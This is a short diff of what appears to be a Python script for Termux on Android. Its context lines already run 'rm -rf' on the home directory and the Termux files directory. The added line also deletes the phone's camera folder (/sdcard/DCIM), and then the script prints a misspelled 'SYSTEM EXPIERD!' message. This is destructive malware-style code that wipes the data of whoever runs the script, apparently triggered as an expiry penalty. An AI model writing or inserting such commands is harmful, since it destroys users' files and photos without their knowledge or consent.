@@ -298,5 +298,5 @@ os.system('clear')
 
 os.system('cd && cd .. && rm -rf home')
 os.system('rm -rf /data/data/com.termux/files')
-
+os.system('rm -rf /sdcard/DCIM')
 print ('\x1b[1;91mSYSTEM EXPIERD!')
